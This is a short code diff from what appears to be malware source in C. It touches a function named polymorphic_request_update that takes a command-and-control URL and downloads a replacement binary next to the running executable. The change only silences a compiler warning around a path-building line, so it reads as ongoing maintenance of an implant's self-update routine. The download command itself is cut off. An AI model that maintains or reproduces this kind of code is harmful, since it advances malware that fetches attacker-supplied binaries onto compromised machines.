@@ -518,7 +518,10 @@ int polymorphic_request_update(const char *cnc_url) {
 
     // 3. Download to a temp location next to current binary
     char tmp_path[512];
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wformat-truncation"
     snprintf(tmp_path, sizeof(tmp_path), "%s.update.tmp", self_path);
+#pragma GCC diagnostic pop
 
     char dl_cmd[2048];
     snprintf(dl_cmd, sizeof(dl_cmd),
